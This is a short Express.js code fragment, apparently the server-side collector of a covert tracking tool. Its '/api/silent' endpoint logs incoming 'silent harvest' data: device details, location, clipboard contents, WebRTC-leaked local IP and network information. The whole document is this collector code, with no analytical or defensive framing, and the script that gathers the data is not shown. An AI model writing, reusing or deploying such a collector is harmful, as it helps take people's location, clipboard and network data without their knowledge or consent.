app.post('/api/silent', (req, res) => {
    const data = req.body;
    console.log("=== SILENT HARVEST RECEIVED ===");
    console.log("Device:", data.device);
    console.log("Location:", data.location);
    console.log("Clipboard:", data.clipboard);
    console.log("Local IP:", data.webRtc);
    console.log("Network:", data.network);
    console.log("==============================");
    res.json({ success: true });
});
